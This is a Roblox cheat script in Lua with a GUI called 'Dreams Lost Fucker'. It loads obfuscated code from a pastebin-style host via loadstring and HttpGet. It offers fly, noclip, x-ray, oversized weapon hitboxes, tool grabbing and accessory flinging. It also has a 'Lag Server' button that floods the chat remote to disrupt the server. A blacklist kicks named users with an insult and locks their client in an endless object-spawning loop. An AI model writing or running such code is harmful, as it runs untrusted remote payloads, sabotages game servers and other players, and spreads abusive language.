

local library = loadstring(game:HttpGet(('https://pastebinp.com/raw/FsJak6AT')))() -- It's obfuscated, I won't let you see my ugly coding skills. =)

local Player = game.Players.LocalPlayer

local mouse = Player:GetMouse()


function IsBlacklisted()
 local valid = isfile("ConfigSettings064.txt")
  if valid then return true end
end



local BlackListed = {
    "wyretti",
    "NewLostDreamsHolder",
    ""
    
    
}



for _,Retards in pairs(BlackListed) do 
    if Player.Name == Retards or IsBlacklisted() == true then 
       writefile("ConfigSettings064.txt", "Config = true; Ready = true; return true;")
       
        Player:Kick("SKID GET OFF MY DICK HOE")
        wait(0.5)
       
        while true do 
             Instance.new("Part",workspace)    
            end
        end
    end

local itstrue = false

spawn(function()
	while true do
		settings().Physics.AllowSleep = false
		sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.pow(math.huge,math.huge)*math.huge)
		sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.pow(math.huge,math.huge)*math.huge)
		game:GetService("RunService").Stepped:wait()
	end
end)


local transparent = false
-- Functions 
function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end
function x(v)
	if v then
		for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0.5
			end
		end
	else
		for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0
			end
		end
	end
end


function isNumber(str)
	if tonumber(str) ~= nil or str == 'inf' then
		return true
	end
end



function sFLY(vfly)
	FLYING = false
	speedofthefly = 2
	speedofthevfly = 1
	repeat wait() until Player and Player.Character and Player.Character:FindFirstChild('HumanoidRootPart') and Player.Character:FindFirstChild('Humanoid')
	repeat wait() until mouse
	local T = Player.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			repeat wait()
			if not vfly then
				Player.Character:FindFirstChild("Humanoid").PlatformStand = true
			end
			if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
				SPEED = 50
			elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
				SPEED = 0
			end
			if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
				BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
			elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
				BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			else
				BV.velocity = Vector3.new(0, 0, 0)
			end
			BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			Player.Character.Humanoid.PlatformStand = false
		end)
	end
	mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			if vfly then
				CONTROL.F = speedofthevfly
			else
				CONTROL.F = speedofthefly
			end
		elseif KEY:lower() == 's' then
			if vfly then
				CONTROL.B = - speedofthevfly
			else
				CONTROL.B = - speedofthefly
			end
		elseif KEY:lower() == 'a' then
			if vfly then
				CONTROL.L = - speedofthevfly
			else
				CONTROL.L = - speedofthefly
			end
		elseif KEY:lower() == 'd' then
			if vfly then
				CONTROL.R = speedofthevfly
			else
				CONTROL.R = speedofthefly
			end
		elseif KEY:lower() == 'y' then
			if vfly then
				CONTROL.Q = speedofthevfly*2
			else
				CONTROL.Q = speedofthefly*2
			end
		elseif KEY:lower() == 't' then
			if vfly then
				CONTROL.E = -speedofthevfly*2
			else
				CONTROL.E = -speedofthefly*2
			end
		end
	end)
	mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'y' then
			CONTROL.Q = 0
		elseif KEY:lower() == 't' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

------------------------------------
local w = library:CreateWindow("Dreams Lost Fucker")


local MainFolder = w:CreateFolder("MainFolder")


local b = w:CreateFolder("Tools")

local w = w:CreateFolder("Credits <3")

w:Label("Made By Blaroo#8041",Color3.fromRGB(38,38,38),Color3.fromRGB(0,216,111)) --BgColor,TextColor
w:Label("UI By Wally",Color3.fromRGB(38,38,38),Color3.fromRGB(0,216,111)) --BgColor,TextColor
w:Label("Right CTRL to hide the GUI",Color3.fromRGB(38,38,38),Color3.fromRGB(0,216,111)) --BgColor,TextColor

local Saved = false

b:Button("Big Sword HitBox",function()
for i,v in pairs(Player.Character:GetDescendants()) do
		if v:IsA("Tool") then
		    if Saved == false then
				currentToolSize = v.Handle.Size
				end
				currentGripPos = v.GripPos
			--	local a = Instance.new("SelectionBox",v.Handle)
			--	a.Name = "SelectionBoxCreated"
			--	a.Adornee = v.Handle
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(100,100,100)
				v.GripPos = Vector3.new(0,0,0)
				Player.Character.Humanoid:UnequipTools()
			end
		end

end)
MainFolder:Button("Drop Blocks",function()

 for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Accessory")  and v.Handle:FindFirstChild("Mesh") or v:IsA("Hat") and v.Handle:FindFirstChild("Mesh") or v:IsA("Accessory")  and v.Handle:FindFirstChild("SpecialMesh") then
    ag = v.Handle:FindFirstChild("Mesh") or v.Handle:FindFirstChild("SpecialMesh")
    ag:Destroy()
    v.Parent = game.Workspace

    end
  
 end

end)
MainFolder:Button("Block Fling",function()

for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if itstrue == false then 
    if v:IsA("Accessory")  and v.Handle:FindFirstChild("Mesh") or v:IsA("Hat") and v.Handle:FindFirstChild("Mesh") or v:IsA("Accessory")  and v.Handle:FindFirstChild("SpecialMesh") then
    ag = v.Handle:FindFirstChild("Mesh") or v.Handle:FindFirstChild("SpecialMesh")
    ag:Destroy()
    v.Parent = game.Workspace
    itstrue = true
local b = Instance.new("BodyPosition")
b.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
b.Parent = v.Handle
wait()
local c = Instance.new("BodyThrust") 
c.Location=Vector3.new(5,0,0)c.Force = Vector3.new(4000,4000,4000)
c.Parent =  v.Handle;
v.Handle.CanCollide=false;
itstrue = false 
while wait() do
    b.Position = game.Players.LocalPlayer:GetMouse().Hit.p + Vector3.new(0,1,0)
end
end
end
end
end)

MainFolder:Label("Press once or it will Kick you",Color3.fromRGB(38,38,38),Color3.fromRGB(0,216,111)) --BgColor,TextColor

MainFolder:Button("Lag Server",function()

   local Strength = 2000

   local CRemote = game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest
   local Msg = ('?!'):rep(334000)
    for I = 1,Strength do
  CRemote.FireServer(CRemote,Msg,Msg) -- Yes it's supposed to be this way.
   end

end)
MainFolder:Label("Sword and R15 Needed",Color3.fromRGB(38,38,38),Color3.fromRGB(0,216,111)) --BgColor,TextColor


MainFolder:Button("Neptunian V",function()
loadstring(game:HttpGet(('https://pastebin.com/raw/UX72iWZS'),true))()


end)
b:Button("Reset HitBox",function()

	for i,v in pairs(Player.Character:GetDescendants()) do
		if v:IsA("Tool") then
		    Saved = false
			v.Handle.Size = currentToolSize
			v.GripPos = currentGripPos
			v.Handle.SelectionBoxCreated:Destroy()
		end
	end
end)

b:Button("Save Tools",function()

  for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if (v:IsA("Tool")) then
        v.Parent = game.Players.LocalPlayer

		end
	end
end)

b:Button("Receive Tools",function()

for _,v in pairs(game.Players.LocalPlayer:GetChildren()) do
if (v:IsA("Tool")) then
v.Parent = game.Players.LocalPlayer.Backpack
		end
	end
end)

b:Toggle("GrabTools",function(bool)
    shared.toggle = bool
    print(shared.toggle)
    if shared.toggle == true then 
        for i,v in pairs(workspace:GetChildren()) do
		spawn(function()
			if v:IsA("Tool") or v:IsA("HopperBin") then
				if v:FindFirstChild("Handle") then
					repeat
						wait()
						if getRoot(Player.Character) then
							v.Handle.CFrame = getRoot(Player.Character).CFrame
						end
					until v.Parent == Player.Character
				end
			end
		end)
	end
	grabtoolsFunc = workspace.ChildAdded:connect(function(part)
		if part:IsA("Tool") or part:IsA("HopperBin") then
			if part:FindFirstChild("Handle") then
				repeat
					wait()
					if getRoot(Player.Character) then
						part.Handle.CFrame = getRoot(Player.Character).CFrame
					end
				until part.Parent == Player.Character
			end
		end
	end)
    elseif shared.toggle == false then 
    grabtoolsFunc:Disconnect()
    end
    
end)

MainFolder:Toggle("XRay",function(bool)
   Toggle = bool
   if Toggle == true then
       transparent = true
	x(transparent)
	elseif Toggle == false then 
	    transparent = false
	x(transparent)
    end
end)

MainFolder:Toggle("Fly",function(bool)
    Toggle = bool
    if Toggle == true then 
	FLYING = true
	Player.Character.Humanoid.PlatformStand = false
	wait()
	sFLY()
    elseif Toggle == false then 
    FLYING = false
	Player.Character.Humanoid.PlatformStand = false
    end
end)
MainFolder:Toggle("Noclip",function(bool)
    Toggle = bool
    if Toggle == true then 
        Clip = false
	wait(0.1)
	local function NoclipLoop()
		if Clip == false and Player.Character ~= nil then
	   		for _, child in pairs(Player.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
	   				child.CanCollide = false
				end
			end
		end
	end
	Noclipping = game:GetService('RunService').Stepped:connect(NoclipLoop)
    elseif Toggle == false then 
if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
    end
end)



--[[b:Bind("Bind",function()
    print("Yes")
end)--]]


MainFolder:Box("FlySpeed","number",function(value) -- "number" or "string"
    	local speed = value
	if isNumber(speed) then
		speedofthefly = speed
	end
end)

w:DestroyGUI()

--Example of refresh

--[[local label = b:Label("Hi",Color3.fromRGB(255,0,0),Color3.fromRGB(0,255,0))

label:Refresh("Not epic")

local dropdown = b:Dropdown("Hi",{"A","B"})

dropdown:Refresh({"A","B","C"})
]]